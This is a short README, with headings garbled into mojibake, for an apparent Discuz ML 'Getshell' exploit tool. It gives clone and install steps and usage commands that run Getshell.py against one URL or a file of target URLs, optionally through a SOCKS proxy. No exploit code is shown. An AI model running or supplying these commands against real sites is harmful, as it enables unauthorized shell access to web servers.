## 0x01��װ
```bash
git clone https://github.com/wjlin0/Discuz_Ml_Getshell.git
cd Discuz_Ml_Getshell
python -m venv .venv
# linux
source .venv/bin/activate 
# windows 
# ./venv/Scripts/activate

pip3 install -r requirements.rxt
```
## 0x02 ʹ��
```bash
# �ű���ǰĿ¼��
#linux
source .venv/bin/activate
# windows
# ./venv/Scripts/activate

# ָ��url
python Getshell.py --url www.example.com

# ָ���ļ�
python Getshell.py --file example.txt
# ��Ӵ���
python Getshell.py --proxy socks5://127.0.0.1:53201 --proxy_cred=admin:admin --url www.example.com

# ָ������ļ�λ��
python Getshell.py --url www.example.com --outfile /tmp/outfile.txt

```